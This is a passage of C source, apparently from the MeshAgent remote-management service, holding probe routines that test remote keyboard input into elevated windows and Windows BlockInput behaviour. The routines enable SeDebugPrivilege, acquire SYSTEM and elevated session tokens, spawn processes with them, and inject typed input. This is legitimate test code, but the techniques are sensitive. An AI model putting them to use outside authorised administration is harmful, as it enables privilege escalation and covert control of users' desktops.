	WCHAR targetExePath[MAX_PATH * 2] = { 0 };
	WCHAR hwndReportPath[MAX_PATH] = { 0 };
	WCHAR capturePath[MAX_PATH] = { 0 };
	WCHAR readyPath[MAX_PATH] = { 0 };
	WCHAR probeDesktop[64] = { 0 };
	WCHAR targetDesktop[64] = L"winsta0\\default";
	WCHAR windowTitle[128] = { 0 };
	WCHAR windowSnapshot[2048] = { 0 };
	WCHAR cmdPath[MAX_PATH] = { 0 };
	WCHAR targetArgs[2048] = { 0 };
	DWORD sessionId = MeshService_GetCurrentSessionId();
	DWORD bridgePid = 0;
	DWORD bridgeSpawnMs = 0;
	DWORD bridgePacketMs = 0;
	DWORD bridgeExitMs = 0;
	DWORD bridgeSessionId = 0;
	DWORD bridgeIntegrityRid = 0;
	DWORD targetWindowReportMs = 0;
	DWORD targetWindowMs = 0;
	DWORD targetSpawnError = ERROR_SUCCESS;
	DWORD targetWaitResult = WAIT_FAILED;
	DWORD targetSessionId = 0;
	DWORD targetIntegrityRid = 0;
	DWORD targetReadyMs = 0;
	DWORD probeWindowStationError = ERROR_SUCCESS;
	DWORD probeDesktopError = ERROR_SUCCESS;
	DWORD elevatedTokenError = ERROR_SUCCESS;
	TOKEN_ELEVATION_TYPE bridgeElevationType = TokenElevationTypeDefault;
	TOKEN_ELEVATION_TYPE targetElevationType = TokenElevationTypeDefault;
	HWND targetWindow = NULL;
	BOOL chainCreated = FALSE;
	BOOL chainThreadStarted = FALSE;
	BOOL relayStarted = FALSE;
	BOOL bridgeSpawned = FALSE;
	BOOL bridgePacketsReady = FALSE;
	BOOL bridgeUsed = FALSE;
	BOOL fallbackUsed = FALSE;
	BOOL bridgeSystemSid = FALSE;
	BOOL bridgeStateReady = FALSE;
	BOOL probeWindowStationBound = FALSE;
	BOOL probeDesktopBound = FALSE;
	BOOL elevatedTokenReady = FALSE;
	BOOL targetSpawned = FALSE;
	BOOL targetReady = FALSE;
	BOOL targetWindowReported = FALSE;
	BOOL targetWindowFound = FALSE;
	BOOL targetFocused = FALSE;
	BOOL targetStateReady = FALSE;
	BOOL targetHighIntegrity = FALSE;
	BOOL inputSent = FALSE;
	BOOL targetExited = FALSE;
	BOOL capturedMatches = FALSE;
	BOOL cleanupExited = FALSE;
	BOOL success = FALSE;

	ZeroMemory(&state, sizeof(state));
	ZeroMemory(&targetProcess, sizeof(targetProcess));
	sprintf_s(marker, sizeof(marker), "MESHINPUT_%lu", (unsigned long)GetCurrentProcessId());
	probeWindowStationBound = MeshService_BindCurrentProcessToInteractiveWindowStation(&probeWindowStationError);
	probeDesktopBound = MeshService_BindCurrentThreadToNamedDesktop(L"Default", probeDesktop, _countof(probeDesktop), &probeDesktopError);
	if (!probeDesktopBound)
	{
		probeDesktopBound = MeshService_BindCurrentThreadToInputDesktop(probeDesktop, _countof(probeDesktop), &probeDesktopError);
	}

	if (sessionId == 0 || sessionId == 0xFFFFFFFF)
	{
		printf("{\"success\":false,\"phase\":\"kvm-elevated-input-probe\",\"sessionId\":%lu,\"error\":\"invalid-session\"}\n", (unsigned long)sessionId);
		fflush(stdout);
		return 1;
	}

	chain = ILibCreateChainEx(0);
	chainCreated = (chain != NULL);
	if (chainCreated)
	{
		pipeManager = ILibProcessPipe_Manager_Create(chain);
	}
	if (pipeManager != NULL)
	{
		chainThread = CreateThread(NULL, 0, MeshService_KvmSessionChangeProbeChainThread, chain, 0, NULL);
		chainThreadStarted = (chainThread != NULL);
	}
	if (!chainThreadStarted)
	{
		printf("{\"success\":false,\"phase\":\"kvm-elevated-input-probe\",\"sessionId\":%lu,\"chainCreated\":%s,\"chainThreadStarted\":%s}\n",
			(unsigned long)sessionId,
			chainCreated ? "true" : "false",
			chainThreadStarted ? "true" : "false");
		fflush(stdout);
		if (chain != NULL) { ILibStopChain(chain); }
		if (chainThread != NULL) { CloseHandle(chainThread); }
		return 1;
	}

	Sleep(200);
	GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath));
	kvm_set_force_default_desktop(1);
	relayStarted = (kvm_relay_setup(exePath, pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
	if (relayStarted)
	{
		bridgeSpawned = MeshService_WaitForBridgePidChange(0, 5000, &bridgeSpawnMs, &bridgePid);
		if (bridgeSpawned)
		{
			bridgePacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, 5000, &bridgePacketMs);
			bridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
			fallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
			bridgeStateReady = MeshService_QueryProcessSecurityState(bridgePid, &bridgeSystemSid, &bridgeIntegrityRid, &bridgeElevationType, &bridgeSessionId);
		}
	}

	if (bridgePacketsReady && bridgeUsed && !fallbackUsed)
	{
		elevatedTokenReady = MeshService_OpenElevatedPrimaryTokenForSession(sessionId, &elevatedToken, &elevatedTokenError);
	}

	if (elevatedTokenReady)
	{
		if (ExpandEnvironmentStringsW(L"%PUBLIC%\\Documents\\MeshAgent\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
		{
			GetTempPathW((DWORD)_countof(tempPath), tempPath);
		}
		else
		{
			CreateDirectoryW(tempPath, NULL);
		}
		StringCchPrintfW(capturePath, _countof(capturePath), L"%lsMeshKvmElevatedInput_%lu.txt", tempPath, GetCurrentProcessId());
		StringCchPrintfW(readyPath, _countof(readyPath), L"%lsMeshKvmElevatedInput_%lu.ready", tempPath, GetCurrentProcessId());
		StringCchPrintfW(hwndReportPath, _countof(hwndReportPath), L"%lsMeshKvmElevatedInput_%lu.hwnd", tempPath, GetCurrentProcessId());
		StringCchPrintfW(windowTitle, _countof(windowTitle), L"MeshKvmElevatedInput_%lu", GetCurrentProcessId());
		DeleteFileW(capturePath);
		DeleteFileW(readyPath);
		DeleteFileW(hwndReportPath);
		if (GetModuleFileNameW(NULL, targetExePath, (DWORD)_countof(targetExePath)) > 0 &&
			ExpandEnvironmentStringsW(L"%SystemRoot%\\System32\\cmd.exe", cmdPath, (DWORD)_countof(cmdPath)) > 0 &&
			SUCCEEDED(StringCchPrintfW(
				targetArgs,
				_countof(targetArgs),
				L"/Q /C \"\"%ls\" -kvm-elevated-input-target \"%ls\" \"%ls\" \"%ls\" \"%ls\"\"",
				targetExePath,
				hwndReportPath,
				readyPath,
				capturePath,
				windowTitle)))
		{
			targetSpawned = MeshService_SpawnVisibleExecutableWithTokenW(elevatedToken, cmdPath, targetArgs, targetDesktop, &targetProcess, &targetSpawnError);
		}
		else
		{
			targetSpawnError = ERROR_WRITE_FAULT;
		}
	}

	if (targetSpawned)
	{
		ULONGLONG readyStarted = GetTickCount64();
		WaitForInputIdle(targetProcess.hProcess, 5000);
		while ((GetTickCount64() - readyStarted) <= 10000)
		{
			char* readyText = MeshService_ReadUtf8TextFileW(readyPath);
			if (readyText != NULL)
			{
				targetReady = TRUE;
				targetReadyMs = (DWORD)(GetTickCount64() - readyStarted);
				free(readyText);
				break;
			}
			Sleep(50);
		}
		targetWindowReported = MeshService_WaitForReportedWindowHandleW(hwndReportPath, 0, 10000, &targetWindowReportMs, &targetWindow);
		if (targetWindowReported)
		{
			targetWindowFound = TRUE;
			targetWindowMs = targetWindowReportMs;
		}
		else
		{
			targetWindowFound = MeshService_WaitForTopLevelWindowByTitleW(windowTitle, probeDesktop, 10000, &targetWindowMs, &targetWindow);
		}
		MeshService_BuildWindowSnapshotForSessionW(sessionId, probeDesktop, windowSnapshot, _countof(windowSnapshot));
		targetStateReady = MeshService_QueryProcessSecurityState(targetProcess.dwProcessId, NULL, &targetIntegrityRid, &targetElevationType, &targetSessionId);
		targetHighIntegrity = (targetStateReady && targetIntegrityRid >= SECURITY_MANDATORY_HIGH_RID);
		if (targetWindowFound)
		{
			targetFocused = MeshService_BringWindowToForeground(targetWindow);
		}
		Sleep(targetWindowFound ? 400 : 1000);
		inputSent = MeshService_KvmTypeMarkerText(marker, MeshService_KvmSessionChangeProbeWriteSink, &state);
	}

	if (inputSent)
	{
		targetWaitResult = WaitForSingleObject(targetProcess.hProcess, 10000);
		targetExited = (targetWaitResult == WAIT_OBJECT_0);
	}
	if (targetExited)
	{
		capturedText = MeshService_ReadUtf8TextFileW(capturePath);
		if (capturedText != NULL)
		{
			MeshService_TrimLineEndingsA(capturedText);
			capturedMatches = (strcmp(capturedText, marker) == 0);
		}
	}

	if (targetProcess.hProcess != NULL && !targetExited)
	{
		TerminateProcess(targetProcess.hProcess, 1);
		WaitForSingleObject(targetProcess.hProcess, 2000);
	}
	if (relayStarted)
	{
		kvm_cleanup(&state);
		kvm_set_force_default_desktop(0);
		if (bridgePid != 0)
		{
			cleanupExited = MeshService_WaitForProcessExitById(bridgePid, 5000, &bridgeExitMs);
		}
		else
		{
			cleanupExited = TRUE;
		}
		Sleep(250);
	}
	else
	{
		kvm_set_force_default_desktop(0);
	}

	success =
		relayStarted &&
		bridgeSpawned &&
		bridgePacketsReady &&
		bridgeUsed &&
		!fallbackUsed &&
		bridgeStateReady &&
		bridgeSystemSid &&
		bridgeIntegrityRid >= SECURITY_MANDATORY_SYSTEM_RID &&
		bridgeSessionId == sessionId &&
		elevatedTokenReady &&
		targetSpawned &&
		targetStateReady &&
		targetHighIntegrity &&
		targetSessionId == sessionId &&
		inputSent &&
		targetExited &&
		capturedMatches &&
		cleanupExited;

	printf("{\"success\":%s,", success ? "true" : "false");
	printf("\"phase\":\"kvm-elevated-input-probe\",");
	printf("\"sessionId\":%lu,", (unsigned long)sessionId);
	printf("\"relayStarted\":%s,", relayStarted ? "true" : "false");
	printf("\"bridgeSpawned\":%s,", bridgeSpawned ? "true" : "false");
	printf("\"bridgePacketsReady\":%s,", bridgePacketsReady ? "true" : "false");
	printf("\"bridgeUsed\":%s,", bridgeUsed ? "true" : "false");
	printf("\"fallbackUsed\":%s,", fallbackUsed ? "true" : "false");
	printf("\"bridgePid\":%lu,", (unsigned long)bridgePid);
	printf("\"bridgeSpawnMs\":%lu,", (unsigned long)bridgeSpawnMs);
	printf("\"bridgePacketMs\":%lu,", (unsigned long)bridgePacketMs);
	printf("\"bridgeStateReady\":%s,", bridgeStateReady ? "true" : "false");
	printf("\"bridgeSystemSid\":%s,", bridgeSystemSid ? "true" : "false");
	printf("\"bridgeIntegrityRid\":%lu,", (unsigned long)bridgeIntegrityRid);
	printf("\"bridgeElevationType\":%lu,", (unsigned long)bridgeElevationType);
	printf("\"bridgeSessionId\":%lu,", (unsigned long)bridgeSessionId);
	printf("\"probeWindowStationBound\":%s,", probeWindowStationBound ? "true" : "false");
	printf("\"probeWindowStationError\":%lu,", (unsigned long)probeWindowStationError);
	printf("\"probeDesktopBound\":%s,", probeDesktopBound ? "true" : "false");
	printf("\"probeDesktopError\":%lu,", (unsigned long)probeDesktopError);
	printf("\"probeDesktop\":\""); MeshService_PrintJsonEscapedWide(probeDesktop); printf("\",");
	printf("\"targetDesktop\":\""); MeshService_PrintJsonEscapedWide(targetDesktop); printf("\",");
	printf("\"elevatedTokenReady\":%s,", elevatedTokenReady ? "true" : "false");
	printf("\"elevatedTokenError\":%lu,", (unsigned long)elevatedTokenError);
	printf("\"targetSpawned\":%s,", targetSpawned ? "true" : "false");
	printf("\"targetSpawnError\":%lu,", (unsigned long)targetSpawnError);
	printf("\"targetPid\":%lu,", (unsigned long)targetProcess.dwProcessId);
	printf("\"targetReady\":%s,", targetReady ? "true" : "false");
	printf("\"targetReadyMs\":%lu,", (unsigned long)targetReadyMs);
	printf("\"targetWindowReported\":%s,", targetWindowReported ? "true" : "false");
	printf("\"targetWindowReportMs\":%lu,", (unsigned long)targetWindowReportMs);
	printf("\"targetWindowFound\":%s,", targetWindowFound ? "true" : "false");
	printf("\"targetWindowMs\":%lu,", (unsigned long)targetWindowMs);
	printf("\"targetFocused\":%s,", targetFocused ? "true" : "false");
	printf("\"targetStateReady\":%s,", targetStateReady ? "true" : "false");
	printf("\"targetIntegrityRid\":%lu,", (unsigned long)targetIntegrityRid);
	printf("\"targetElevationType\":%lu,", (unsigned long)targetElevationType);
	printf("\"targetHighIntegrity\":%s,", targetHighIntegrity ? "true" : "false");
	printf("\"targetSessionId\":%lu,", (unsigned long)targetSessionId);
	printf("\"inputSent\":%s,", inputSent ? "true" : "false");
	printf("\"targetExited\":%s,", targetExited ? "true" : "false");
	printf("\"targetWaitResult\":%lu,", (unsigned long)targetWaitResult);
	printf("\"capturedMatches\":%s,", capturedMatches ? "true" : "false");
	printf("\"cleanupExited\":%s,", cleanupExited ? "true" : "false");
	printf("\"bridgeExitMs\":%lu,", (unsigned long)bridgeExitMs);
	printf("\"windowTitle\":\""); MeshService_PrintJsonEscapedWide(windowTitle); printf("\",");
	printf("\"windowSnapshot\":\""); MeshService_PrintJsonEscapedWide(windowSnapshot); printf("\",");
	printf("\"marker\":\""); MeshService_PrintJsonEscapedUtf8(marker); printf("\",");
	printf("\"capturedText\":\""); MeshService_PrintJsonEscapedUtf8(capturedText != NULL ? capturedText : ""); printf("\",");
	printf("\"targetExePath\":\""); MeshService_PrintJsonEscapedWide(targetExePath); printf("\",");
	printf("\"hwndReportPath\":\""); MeshService_PrintJsonEscapedWide(hwndReportPath); printf("\",");
	printf("\"readyPath\":\""); MeshService_PrintJsonEscapedWide(readyPath); printf("\",");
	printf("\"capturePath\":\""); MeshService_PrintJsonEscapedWide(capturePath); printf("\"}\n");
	fflush(stdout);

	if (targetProcess.hThread != NULL) { CloseHandle(targetProcess.hThread); }
	if (targetProcess.hProcess != NULL) { CloseHandle(targetProcess.hProcess); }
	if (elevatedToken != NULL) { CloseHandle(elevatedToken); }
	if (capturedText != NULL) { free(capturedText); }
	DeleteFileW(hwndReportPath);
	DeleteFileW(readyPath);
	DeleteFileW(capturePath);
	if (chain != NULL) { ILibStopChain(chain); }
	if (chainThread != NULL)
	{
		WaitForSingleObject(chainThread, 5000);
		CloseHandle(chainThread);
	}
	return success ? 0 : 1;
}

static int MeshService_RunKvmElevatedInputProbeChildCommand(const WCHAR* reportPath)
{
	FILE* redirectedStdout = NULL;
	errno_t redirectError = 0;

	if (reportPath != NULL && reportPath[0] != L'\0')
	{
		redirectError = _wfreopen_s(&redirectedStdout, reportPath, L"wb", stdout);
		if (redirectError != 0 || redirectedStdout == NULL)
		{
			return 1;
		}
	}
	return MeshService_RunKvmElevatedInputProbeWorkerCommand();
}

static int MeshService_RunKvmElevatedInputProbeCommand(void)
{
	WCHAR tempPath[MAX_PATH] = { 0 };
	WCHAR reportPath[MAX_PATH] = { 0 };
	WCHAR arguments[512] = { 0 };
	HANDLE systemToken = NULL;
	PROCESS_INFORMATION childProcess;
	DWORD sessionId = MeshService_GetCurrentSessionId();
	DWORD systemTokenError = ERROR_SUCCESS;
	DWORD spawnError = ERROR_SUCCESS;
	DWORD childExitCode = STILL_ACTIVE;
	BOOL systemTokenReady = FALSE;
	BOOL childSpawned = FALSE;
	char* childJson = NULL;

	if (MeshService_ProcessHasSystemSid())
	{
		return MeshService_RunKvmElevatedInputProbeWorkerCommand();
	}

	ZeroMemory(&childProcess, sizeof(childProcess));
	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
	{
		GetTempPathW((DWORD)_countof(tempPath), tempPath);
	}
	StringCchPrintfW(reportPath, _countof(reportPath), L"%lsMeshKvmElevatedInputProbe_%lu.json", tempPath, GetCurrentProcessId());
	DeleteFileW(reportPath);

	MeshService_EnableNamedPrivilegeW(L"SeDebugPrivilege");
	systemTokenReady = MeshService_OpenPrimarySystemTokenForSession(sessionId, &systemToken, &systemTokenError);
	if (systemTokenReady)
	{
		StringCchPrintfW(arguments, _countof(arguments), L"-kvm-elevated-input-probe-child \"%ls\"", reportPath);
		childSpawned = MeshService_SpawnProcessWithTokenW(systemToken, arguments, L"winsta0\\default", &childProcess, &spawnError);
	}
	if (childSpawned)
	{
		WaitForSingleObject(childProcess.hProcess, 60000);
		GetExitCodeProcess(childProcess.hProcess, &childExitCode);
	}

	childJson = MeshService_ReadUtf8TextFileW(reportPath);
	if (childJson != NULL)
	{
		printf("%s\n", childJson);
	}
	else
	{
		printf("{\"success\":false,\"phase\":\"kvm-elevated-input-probe\",\"sessionId\":%lu,\"systemTokenReady\":%s,\"childSpawned\":%s,\"systemTokenError\":%lu,\"spawnError\":%lu,\"childExitCode\":%lu}\n",
			(unsigned long)sessionId,
			systemTokenReady ? "true" : "false",
			childSpawned ? "true" : "false",
			(unsigned long)systemTokenError,
			(unsigned long)spawnError,
			(unsigned long)childExitCode);
	}
	fflush(stdout);

	if (childProcess.hThread != NULL) { CloseHandle(childProcess.hThread); }
	if (childProcess.hProcess != NULL) { CloseHandle(childProcess.hProcess); }
	if (systemToken != NULL) { CloseHandle(systemToken); }
	if (childJson != NULL) { free(childJson); }
	DeleteFileW(reportPath);
	return (childSpawned && childExitCode == 0 && childJson != NULL) ? 0 : 1;
}

static int MeshService_RunKvmBlockInputHolderCommand(const WCHAR* readyPath, const WCHAR* releasePath, const WCHAR* reportPath)
{
	WCHAR desktopName[64] = { 0 };
	char reportJson[1024];
	INPUT inputs[2];
	DWORD windowStationError = ERROR_SUCCESS;
	DWORD desktopError = ERROR_SUCCESS;
	DWORD blockInputError = ERROR_SUCCESS;
	DWORD sameThreadSendInputError = ERROR_SUCCESS;
	DWORD releaseCallError = ERROR_SUCCESS;
	DWORD sameThreadSendInputCount = 0;
	DWORD releaseWaitMs = 0;
	BOOL windowStationBound = FALSE;
	BOOL desktopBound = FALSE;
	BOOL blockInputEnabled = FALSE;
	BOOL sameThreadSendInputSucceeded = FALSE;
	BOOL readySignaled = FALSE;
	BOOL releaseRequested = FALSE;
	BOOL releaseCallSucceeded = FALSE;
	BOOL reportWritten = FALSE;
	BOOL success = FALSE;

	windowStationBound = MeshService_BindCurrentProcessToInteractiveWindowStation(&windowStationError);
	desktopBound = MeshService_BindCurrentThreadToNamedDesktop(L"Default", desktopName, _countof(desktopName), &desktopError);
	if (!desktopBound)
	{
		desktopBound = MeshService_BindCurrentThreadToInputDesktop(desktopName, _countof(desktopName), &desktopError);
	}

	SetLastError(ERROR_SUCCESS);
	if (BlockInput(TRUE))
	{
		blockInputEnabled = TRUE;
	}
	else
	{
		blockInputError = GetLastError();
	}

	if (blockInputEnabled)
	{
		ZeroMemory(inputs, sizeof(inputs));
		inputs[0].type = INPUT_KEYBOARD;
		inputs[0].ki.wVk = VK_F24;
		inputs[1] = inputs[0];
		inputs[1].ki.dwFlags = KEYEVENTF_KEYUP;

		SetLastError(ERROR_SUCCESS);
		sameThreadSendInputCount = SendInput(2, inputs, sizeof(INPUT));
		if (sameThreadSendInputCount == 2)
		{
			sameThreadSendInputSucceeded = TRUE;
		}
		else
		{
			sameThreadSendInputError = GetLastError();
		}

		if (readyPath != NULL && readyPath[0] != L'\0')
		{
			readySignaled = MeshService_WriteWideTextFileUtf8W(readyPath, L"READY");
		}

		releaseRequested = MeshService_WaitForFilePresenceW(releasePath, 15000, &releaseWaitMs);

		SetLastError(ERROR_SUCCESS);
		if (BlockInput(FALSE))
		{
			releaseCallSucceeded = TRUE;
		}
		else
		{
			releaseCallError = GetLastError();
		}
	}

	success =
		windowStationBound &&
		desktopBound &&
		blockInputEnabled &&
		sameThreadSendInputSucceeded;

	sprintf_s(
		reportJson,
		sizeof(reportJson),
		"{\"success\":%s,\"phase\":\"kvm-blockinput-holder\",\"windowStationBound\":%s,\"windowStationError\":%lu,"
		"\"desktopBound\":%s,\"desktopError\":%lu,\"blockInputEnabled\":%s,\"blockInputError\":%lu,"
		"\"sameThreadSendInputSucceeded\":%s,\"sameThreadSendInputCount\":%lu,\"sameThreadSendInputError\":%lu,"
		"\"readySignaled\":%s,\"releaseRequested\":%s,\"releaseWaitMs\":%lu,\"releaseCallSucceeded\":%s,\"releaseCallError\":%lu}",
		success ? "true" : "false",
		windowStationBound ? "true" : "false",
		(unsigned long)windowStationError,
		desktopBound ? "true" : "false",
		(unsigned long)desktopError,
		blockInputEnabled ? "true" : "false",
		(unsigned long)blockInputError,
		sameThreadSendInputSucceeded ? "true" : "false",
		(unsigned long)sameThreadSendInputCount,
		(unsigned long)sameThreadSendInputError,
		readySignaled ? "true" : "false",
		releaseRequested ? "true" : "false",
		(unsigned long)releaseWaitMs,
		releaseCallSucceeded ? "true" : "false",
		(unsigned long)releaseCallError);

	if (reportPath != NULL && reportPath[0] != L'\0')
	{
		reportWritten = MeshService_WriteUtf8TextFileW(reportPath, reportJson);
	}
	else
	{
		reportWritten = TRUE;
		printf("%s\n", reportJson);
		fflush(stdout);
	}

	return (success && reportWritten) ? 0 : 1;
}

static int MeshService_RunKvmBlockInputProbeWorkerCommand(void)
{
	MeshServiceKvmSessionChangeProbeState state;
	char exePath[MAX_PATH * 4] = { 0 };
	char marker[64] = { 0 };
	char* capturedText = NULL;
	char* blockerJson = NULL;
	void* chain = NULL;
	void* pipeManager = NULL;
	HANDLE chainThread = NULL;
	HANDLE elevatedToken = NULL;
	PROCESS_INFORMATION targetProcess;
	PROCESS_INFORMATION blockerProcess;
	WCHAR tempPath[MAX_PATH] = { 0 };
	WCHAR targetExePath[MAX_PATH * 2] = { 0 };
	WCHAR hwndReportPath[MAX_PATH] = { 0 };
	WCHAR capturePath[MAX_PATH] = { 0 };
	WCHAR readyPath[MAX_PATH] = { 0 };
	WCHAR blockerReadyPath[MAX_PATH] = { 0 };
	WCHAR blockerReleasePath[MAX_PATH] = { 0 };
	WCHAR blockerReportPath[MAX_PATH] = { 0 };
	WCHAR probeDesktop[64] = { 0 };
	WCHAR targetDesktop[64] = L"winsta0\\default";
	WCHAR windowTitle[128] = { 0 };
	WCHAR windowSnapshot[2048] = { 0 };
	WCHAR targetArgs[2048] = { 0 };
	WCHAR blockerArgs[1024] = { 0 };
	DWORD sessionId = MeshService_GetCurrentSessionId();
	DWORD bridgePid = 0;
	DWORD bridgeSpawnMs = 0;
	DWORD bridgePacketMs = 0;
	DWORD bridgeExitMs = 0;
	DWORD bridgeSessionId = 0;
	DWORD bridgeIntegrityRid = 0;
	DWORD targetWindowReportMs = 0;
	DWORD targetWindowMs = 0;
	DWORD targetSpawnError = ERROR_SUCCESS;
	DWORD targetWaitResult = WAIT_FAILED;
	DWORD targetSessionId = 0;
	DWORD targetIntegrityRid = 0;
	DWORD targetReadyMs = 0;
	DWORD blockerReadyMs = 0;
	DWORD blockerSpawnError = ERROR_SUCCESS;
	DWORD blockerExitCode = STILL_ACTIVE;
	DWORD blockerWaitResult = WAIT_FAILED;
	DWORD probeWindowStationError = ERROR_SUCCESS;
	DWORD probeDesktopError = ERROR_SUCCESS;
	DWORD elevatedTokenError = ERROR_SUCCESS;
	TOKEN_ELEVATION_TYPE bridgeElevationType = TokenElevationTypeDefault;
	TOKEN_ELEVATION_TYPE targetElevationType = TokenElevationTypeDefault;
	HWND targetWindow = NULL;
	BOOL chainCreated = FALSE;
	BOOL chainThreadStarted = FALSE;
	BOOL relayStarted = FALSE;
	BOOL bridgeSpawned = FALSE;
	BOOL bridgePacketsReady = FALSE;
	BOOL bridgeUsed = FALSE;
	BOOL fallbackUsed = FALSE;
	BOOL bridgeSystemSid = FALSE;
	BOOL bridgeStateReady = FALSE;
	BOOL probeWindowStationBound = FALSE;
	BOOL probeDesktopBound = FALSE;
	BOOL elevatedTokenReady = FALSE;
	BOOL targetSpawned = FALSE;
	BOOL targetReady = FALSE;
	BOOL targetWindowReported = FALSE;
	BOOL targetWindowFound = FALSE;
	BOOL targetFocused = FALSE;
	BOOL targetStateReady = FALSE;
	BOOL targetHighIntegrity = FALSE;
	BOOL blockerSpawned = FALSE;
	BOOL blockerReady = FALSE;
	BOOL blockerReleaseWritten = FALSE;
	BOOL blockerExited = FALSE;
	BOOL blockerReportAvailable = FALSE;
	BOOL blockerSuccess = FALSE;
	BOOL blockerBlockInputEnabled = FALSE;
	BOOL blockerSameThreadSendInputSucceeded = FALSE;
	BOOL inputSent = FALSE;
	BOOL targetExited = FALSE;
	BOOL capturedMatches = FALSE;
	BOOL cleanupExited = FALSE;
	BOOL success = FALSE;

	ZeroMemory(&state, sizeof(state));
	ZeroMemory(&targetProcess, sizeof(targetProcess));
	ZeroMemory(&blockerProcess, sizeof(blockerProcess));
	sprintf_s(marker, sizeof(marker), "meshblock%lu", (unsigned long)GetCurrentProcessId());
	probeWindowStationBound = MeshService_BindCurrentProcessToInteractiveWindowStation(&probeWindowStationError);
	probeDesktopBound = MeshService_BindCurrentThreadToNamedDesktop(L"Default", probeDesktop, _countof(probeDesktop), &probeDesktopError);
	if (!probeDesktopBound)
	{
		probeDesktopBound = MeshService_BindCurrentThreadToInputDesktop(probeDesktop, _countof(probeDesktop), &probeDesktopError);
	}

	if (sessionId == 0 || sessionId == 0xFFFFFFFF)
	{
		printf("{\"success\":false,\"phase\":\"kvm-blockinput-probe\",\"sessionId\":%lu,\"error\":\"invalid-session\"}\n", (unsigned long)sessionId);
		fflush(stdout);
		return 1;
	}

	chain = ILibCreateChainEx(0);
	chainCreated = (chain != NULL);
	if (chainCreated)
	{
		pipeManager = ILibProcessPipe_Manager_Create(chain);
	}
	if (pipeManager != NULL)
	{
		chainThread = CreateThread(NULL, 0, MeshService_KvmSessionChangeProbeChainThread, chain, 0, NULL);
		chainThreadStarted = (chainThread != NULL);
	}
	if (!chainThreadStarted)
	{
		printf("{\"success\":false,\"phase\":\"kvm-blockinput-probe\",\"sessionId\":%lu,\"chainCreated\":%s,\"chainThreadStarted\":%s}\n",
			(unsigned long)sessionId,
			chainCreated ? "true" : "false",
			chainThreadStarted ? "true" : "false");
		fflush(stdout);
		if (chain != NULL) { ILibStopChain(chain); }
		if (chainThread != NULL) { CloseHandle(chainThread); }
		return 1;
	}

	Sleep(200);
	GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath));
	kvm_set_force_default_desktop(1);
	relayStarted = (kvm_relay_setup(exePath, pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
	if (relayStarted)
	{
		bridgeSpawned = MeshService_WaitForBridgePidChange(0, 5000, &bridgeSpawnMs, &bridgePid);
		if (bridgeSpawned)
		{
			bridgePacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, 5000, &bridgePacketMs);
			bridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
			fallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
			bridgeStateReady = MeshService_QueryProcessSecurityState(bridgePid, &bridgeSystemSid, &bridgeIntegrityRid, &bridgeElevationType, &bridgeSessionId);
		}
	}

	if (bridgePacketsReady && bridgeUsed && !fallbackUsed)
	{
		elevatedTokenReady = MeshService_OpenElevatedPrimaryTokenForSession(sessionId, &elevatedToken, &elevatedTokenError);
	}

	if (elevatedTokenReady)
	{
		if (ExpandEnvironmentStringsW(L"%PUBLIC%\\Documents\\MeshAgent\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
		{
			GetTempPathW((DWORD)_countof(tempPath), tempPath);
		}
		else
		{
			CreateDirectoryW(tempPath, NULL);
		}

		StringCchPrintfW(capturePath, _countof(capturePath), L"%lsMeshKvmBlockInput_%lu.txt", tempPath, GetCurrentProcessId());
		StringCchPrintfW(readyPath, _countof(readyPath), L"%lsMeshKvmBlockInput_%lu.ready", tempPath, GetCurrentProcessId());
		StringCchPrintfW(hwndReportPath, _countof(hwndReportPath), L"%lsMeshKvmBlockInput_%lu.hwnd", tempPath, GetCurrentProcessId());
		StringCchPrintfW(windowTitle, _countof(windowTitle), L"MeshKvmBlockInput_%lu", GetCurrentProcessId());
		StringCchPrintfW(blockerReadyPath, _countof(blockerReadyPath), L"%lsMeshKvmBlockInput_%lu.blocker.ready", tempPath, GetCurrentProcessId());
		StringCchPrintfW(blockerReleasePath, _countof(blockerReleasePath), L"%lsMeshKvmBlockInput_%lu.blocker.release", tempPath, GetCurrentProcessId());
		StringCchPrintfW(blockerReportPath, _countof(blockerReportPath), L"%lsMeshKvmBlockInput_%lu.blocker.json", tempPath, GetCurrentProcessId());
		DeleteFileW(capturePath);
		DeleteFileW(readyPath);
		DeleteFileW(hwndReportPath);
		DeleteFileW(blockerReadyPath);
		DeleteFileW(blockerReleasePath);
		DeleteFileW(blockerReportPath);

		if (GetModuleFileNameW(NULL, targetExePath, (DWORD)_countof(targetExePath)) > 0 &&
			SUCCEEDED(StringCchPrintfW(
				targetArgs,
				_countof(targetArgs),
				L"-kvm-blockinput-target \"%ls\" \"%ls\" \"%ls\" \"%ls\"",
				hwndReportPath,
				readyPath,
				capturePath,
				windowTitle)))
		{
			targetSpawned = MeshService_SpawnVisibleExecutableWithTokenW(elevatedToken, targetExePath, targetArgs, targetDesktop, &targetProcess, &targetSpawnError);
		}
		else
		{
			targetSpawnError = ERROR_WRITE_FAULT;
		}
	}

	if (targetSpawned)
	{
		ULONGLONG readyStarted = GetTickCount64();
		WaitForInputIdle(targetProcess.hProcess, 5000);
		while ((GetTickCount64() - readyStarted) <= 10000)
		{
			char* readyText = MeshService_ReadUtf8TextFileW(readyPath);
			if (readyText != NULL)
			{
				targetReady = TRUE;
				targetReadyMs = (DWORD)(GetTickCount64() - readyStarted);
				free(readyText);
				break;
			}
			Sleep(50);
		}
		MeshService_BuildWindowSnapshotForSessionW(sessionId, probeDesktop, windowSnapshot, _countof(windowSnapshot));
		targetStateReady = MeshService_QueryProcessSecurityState(targetProcess.dwProcessId, NULL, &targetIntegrityRid, &targetElevationType, &targetSessionId);
		targetHighIntegrity = (targetStateReady && targetIntegrityRid >= SECURITY_MANDATORY_HIGH_RID);
	}

	if (targetSpawned && targetStateReady && targetHighIntegrity &&
